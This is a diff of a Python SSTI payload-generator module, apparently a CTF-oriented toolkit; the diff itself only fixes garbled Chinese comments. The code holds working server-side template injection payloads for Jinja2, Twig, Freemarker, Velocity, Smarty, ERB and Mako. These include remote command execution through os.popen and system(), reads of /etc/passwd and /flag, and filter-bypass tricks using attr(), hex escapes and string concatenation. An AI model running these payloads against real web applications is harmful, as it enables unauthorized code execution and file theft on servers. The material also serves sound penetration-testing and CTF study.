@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
-"""SSTI (Server-Side Template Injection) Payload çæå¨.
+"""SSTI (Server-Side Template Injection) Payload 生成器.
 
-æ¯ææ¨¡æ¿å¼æ:
+支持模板引擎:
     - Jinja2 / Flask
     - Twig (PHP)
     - Freemarker (Java)
@@ -16,36 +16,36 @@
 from typing import List, Dict
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  æ£æµ Payload (Fingerprinting)
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  检测 Payload (Fingerprinting)
+# ═══════════════════════════════════════════════════════════
 
 DETECTION: Dict[str, List[str]] = {
     "Jinja2 (Flask)": [
-        "{{7*7}}",                          # é¢æ: 49
-        "{{'test'.upper()}}",               # é¢æ: TEST
-        "{{config}}",                       # é¢æ: <Config ...>
-        "{{[].__class__.__base__}}",        # å¯¹è±¡æ¢æµ
+        "{{7*7}}",                          # 预期: 49
+        "{{'test'.upper()}}",               # 预期: TEST
+        "{{config}}",                       # 预期: <Config ...>
+        "{{[].__class__.__base__}}",        # 对象探测
         "{{''.__class__.__mro__}}",
-        "${7*7}",                           # æ¿ä»£è¯­æ³
+        "${7*7}",                           # 替代语法
         "{{self.__init__.__globals__}}",
     ],
     "Twig (PHP/Symfony)": [
-        "{{7*7}}",                          # é¢æ: 49
-        "{{_self.env}}",                    # ç¯å¢æ³é²
-        "{{dump(app)}}",                    # dump å½æ°
-        "{{include('index.html')}}",        # æä»¶åå«
+        "{{7*7}}",                          # 预期: 49
+        "{{_self.env}}",                    # 环境泄露
+        "{{dump(app)}}",                    # dump 函数
+        "{{include('index.html')}}",        # 文件包含
         "{{'/etc/passwd'|file_excerpt(1,30)}}",
     ],
     "Freemarker (Java)": [
-        "${7*7}",                           # é¢æ: 49
+        "${7*7}",                           # 预期: 49
         "${product('test')}",
-        "<#assign x=7*7>${x}</#assign>",    # èµå¼è¯­æ³
+        "<#assign x=7*7>${x}</#assign>",    # 赋值语法
         "${.data_model.key_set()}",
         "${object.getClass()}",
     ],
     "Velocity (Java)": [
-        "#set($x=7*7)$x",                   # é¢æ: 49
+        "#set($x=7*7)$x",                   # 预期: 49
         "${class}",
         "#set($runtime = $class.forName('java.lang.Runtime'))",
     ],
@@ -57,13 +57,13 @@ DETECTION: Dict[str, List[str]] = {
         "{system('id')}",
     ],
     "ERB (Ruby)": [
-        "<%= 7*7 %>",                       # é¢æ: 49
+        "<%= 7*7 %>",                       # 预期: 49
         "<%= system('id') %>",
         "<%= File.read('/etc/passwd') %>",
         "<%= `ls` %>",
     ],
     "Mako (Python)": [
-        "${7*7}",                           # é¢æ: 49
+        "${7*7}",                           # 预期: 49
         "${self.module.cache.util.os}",
         "<% import os %>${os.popen('id').read()}",
     ],
@@ -76,23 +76,23 @@ DETECTION: Dict[str, List[str]] = {
 }
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  å©ç¨ Payload (RCE / æä»¶è¯»å)
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  利用 Payload (RCE / 文件读取)
+# ═══════════════════════════════════════════════════════════
 
 EXPLOIT: Dict[str, List[Dict[str, str]]] = {
     "Jinja2 (Flask)": [
         {
-            "name": "RCE - subprocess.Popen (æå¸¸ç¨)",
+            "name": "RCE - subprocess.Popen (最常用)",
             "payload": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
         },
         {
-            "name": "RCE - __subclasses__ é¾",
+            "name": "RCE - __subclasses__ 链",
             "payload": "{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}",
-            "note": "X éè¦æ¿æ¢ä¸º subprocess.Popen çç´¢å¼, ç¨æç´¢åè½æ¥æ¾",
+            "note": "X 需要替换为 subprocess.Popen 的索引, 用搜索功能查找",
         },
         {
-            "name": "RCE - lipsum æ¹å¼",
+            "name": "RCE - lipsum 方式",
             "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
         },
         {
@@ -100,41 +100,41 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "payload": "{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}",
         },
         {
-            "name": "RCE - config æ¹å¼",
+            "name": "RCE - config 方式",
             "payload": "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
         },
         {
-            "name": "æä»¶è¯»å - open",
+            "name": "文件读取 - open",
             "payload": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}",
         },
         {
-            "name": "æä»¶è¯»å - lipsum",
+            "name": "文件读取 - lipsum",
             "payload": "{{ lipsum.__globals__.__builtins__.open('/flag').read() }}",
         },
         {
-            "name": "ä¿¡æ¯æ³é² - config",
+            "name": "信息泄露 - config",
             "payload": "{{ config }}",
         },
         {
-            "name": "Bypass è¿æ»¤ [[]] - attr()",
+            "name": "Bypass 过滤 [[]] - attr()",
             "payload": "{{ ()|attr('__class__')|attr('__base__')|attr('__subclasses__')() }}",
         },
         {
-            "name": "Bypass è¿æ»¤ _ - request",
+            "name": "Bypass 过滤 _ - request",
             "payload": "{{ (request|attr(request.args.attr)).__init__.__globals__.__builtins__ }}",
-            "note": "éè¦ä¼ å ?attr=__class__",
+            "note": "需要传参 ?attr=__class__",
         },
         {
-            "name": "Bypass è¿æ»¤å¼å· - request.args",
+            "name": "Bypass 过滤引号 - request.args",
             "payload": "{{ lipsum.__globals__.__builtins__.open(request.args.f).read() }}",
-            "note": "éè¦ä¼ å ?f=/flag",
+            "note": "需要传参 ?f=/flag",
         },
         {
-            "name": "Bypass è¿æ»¤ - å­ç¬¦ä¸²æ¼æ¥",
+            "name": "Bypass 过滤 - 字符串拼接",
             "payload": "{{ ()|attr('__cla'+'ss__')|attr('__bas'+'e__') }}",
         },
         {
-            "name": "Bypass è¿æ»¤ - åå­è¿å¶",
+            "name": "Bypass 过滤 - 十六进制",
             "payload": "{{ ()['\\x5f\\x5fclass\\x5f\\x5f'] }}",
         },
     ],
@@ -152,17 +152,17 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "payload": "{{ ['whoami']|map('system')|join }}",
         },
         {
-            "name": "æä»¶è¯»å - file_excerpt",
+            "name": "文件读取 - file_excerpt",
             "payload": "{{ '/etc/passwd'|file_excerpt(1, -1) }}",
         },
         {
-            "name": "ä¿¡æ¯æ³é² - _self",
+            "name": "信息泄露 - _self",
             "payload": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ ['id']|map('system') }}",
         },
     ],
     "Freemarker (Java)": [
         {
-            "name": "RCE - Execute (ç»å¸)",
+            "name": "RCE - Execute (经典)",
             "payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /flag')}",
         },
         {
@@ -186,11 +186,11 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "payload": "{system('cat /flag')}",
         },
         {
-            "name": "RCE - php æ ç­¾",
+            "name": "RCE - php 标签",
             "payload": "{php}system('id');{/php}",
         },
         {
-            "name": "æä»¶è¯»å - include",
+            "name": "文件读取 - include",
             "payload": "{include file='/etc/passwd'}",
         },
     ],
@@ -200,15 +200,15 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
             "payload": "<%= system('cat /flag') %>",
         },
         {
-            "name": "RCE - åå¼å·",
+            "name": "RCE - 反引号",
             "payload": "<%= `cat /flag` %>",
         },
         {
-            "name": "æä»¶è¯»å - File.read",
+            "name": "文件读取 - File.read",
             "payload": "<%= File.read('/flag') %>",
         },
         {
-            "name": "æä»¶è¯»å - IO.readlines",
+            "name": "文件读取 - IO.readlines",
             "payload": "<%= IO.readlines('/flag') %>",
         },
     ],
@@ -221,63 +221,63 @@ EXPLOIT: Dict[str, List[Dict[str, str]]] = {
 }
 
 
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-#  Bypass / è¿æ»¤ç»è¿åç»
-# âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
+# ═══════════════════════════════════════════════════════════
+#  Bypass / 过滤绕过分组
+# ═══════════════════════════════════════════════════════════
 
 BYPASS_FILTERS: Dict[str, List[str]] = {
-    "å¼å·è¿æ»¤ç»è¿": [
-        "request.args.param          â ç¨ GET åæ°ä¼ å¥å­ç¬¦ä¸²",
-        "request.values.param        â ç¨ POST åæ°ä¼ å¥å­ç¬¦ä¸²",
-        "request.cookies.param       â ç¨ Cookie ä¼ å¥å­ç¬¦ä¸²",
-        "dict(__cl=dict,ass__=1)|join â å­å¸é®æ¼æ¥",
-        "()|attr('\\x5f\\x5f'+'class\\x5f\\x5f') â åå­è¿å¶ç»è¿",
+    "引号过滤绕过": [
+        "request.args.param          — 用 GET 参数传入字符串",
+        "request.values.param        — 用 POST 参数传入字符串",
+        "request.cookies.param       — 用 Cookie 传入字符串",
+        "dict(__cl=dict,ass__=1)|join — 字典键拼接",
+        "()|attr('\\x5f\\x5f'+'class\\x5f\\x5f') — 十六进制绕过",
     ],
-    "ç¹å·è¿æ»¤ç»è¿": [
-        "()|attr('__class__')        â attr() è¿æ»¤å¨",
-        "()['__class__']             â å­å¸ç´¢å¼",
-        "()|attr(request.args.a)     â ä»è¯·æ±åæ°åå±æ§å",
+    "点号过滤绕过": [
+        "()|attr('__class__')        — attr() 过滤器",
+        "()['__class__']             — 字典索引",
+        "()|attr(request.args.a)     — 从请求参数取属性名",
     ],
-    "ä¸åçº¿è¿æ»¤ç»è¿": [
-        "request.args.param          â ä»è¯·æ±è·å",
-        "()|attr('\\x5f\\x5fclass\\x5f\\x5f') â åå­è¿å¶",
-        "'_'*2~'class'~'_'*2         â å­ç¬¦ä¸²æ¼æ¥",
+    "下划线过滤绕过": [
+        "request.args.param          — 从请求获取",
+        "()|attr('\\x5f\\x5fclass\\x5f\\x5f') — 十六进制",
+        "'_'*2~'class'~'_'*2         — 字符串拼接",
     ],
-    "æ¹æ¬å·è¿æ»¤ç»è¿": [
-        "().__getitem__('class')     â __getitem__",
-        "()|attr('__class__')        â attr",
-        "().__class__                â ç¹å·",
+    "方括号过滤绕过": [
+        "().__getitem__('class')     — __getitem__",
+        "()|attr('__class__')        — attr",
+        "().__class__                — 点号",
     ],
-    "å³é®å­è¿æ»¤ç»è¿": [
-        "eval â lip.sum.__globals__['__builtins__']['ev'+'al']",
-        "import â __builtins__['__imp'+'ort__']",
-        "popen â ...os['po'+'pen']",
-        "class â __dict__['__cla'+'ss__']",
+    "关键字过滤绕过": [
+        "eval → lip.sum.__globals__['__builtins__']['ev'+'al']",
+        "import → __builtins__['__imp'+'ort__']",
+        "popen → ...os['po'+'pen']",
+        "class → __dict__['__cla'+'ss__']",
     ],
 }
 
 
 def get_detection(engine: str = "") -> dict:
-    """è·åæ£æµ Payload åè¡¨."""
+    """获取检测 Payload 列表."""
     if engine and engine in DETECTION:
         return {engine: DETECTION[engine]}
     return DETECTION
 
 
 def get_exploit(engine: str = "") -> dict:
-    """è·åå©ç¨ Payload åè¡¨."""
+    """获取利用 Payload 列表."""
     if engine and engine in EXPLOIT:
         return {engine: EXPLOIT[engine]}
     return EXPLOIT
 
 
 def get_bypass() -> dict:
-    """è·åç»è¿è¿æ»¤çæå·§åè¡¨."""
+    """获取绕过过滤的技巧列表."""
     return BYPASS_FILTERS
 
 
 def search_payload(keyword: str) -> list:
-    """å¨ææ Payload ä¸­æç´¢å³é®å­."""
+    """在所有 Payload 中搜索关键字."""
     results = []
     for engine, payloads in EXPLOIT.items():
         for p in payloads:
@@ -287,10 +287,10 @@ def search_payload(keyword: str) -> list:
 
 
 def subclasses_finder() -> str:
-    """çæç¨äºæ¥æ¾ subprocess.Popen ç´¢å¼çæ£æµ Payload."""
+    """生成用于查找 subprocess.Popen 索引的检测 Payload."""
     return (
         "{{ ''.__class__.__mro__[1].__subclasses__() }}"
-        "\n# å¨è¾åºä¸­æç´¢ 'subprocess.Popen', è®°ä¸å®çç´¢å¼ (ä»0å¼å§æ°)"
-        "\n# ç¶åå° X æ¿æ¢ä¸ºè¯¥ç´¢å¼:"
+        "\n# 在输出中搜索 'subprocess.Popen', 记下它的索引 (从0开始数)"
+        "\n# 然后将 X 替换为该索引:"
         "\n# {{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['sys'].modules['os'].popen('id').read() }}"
     )
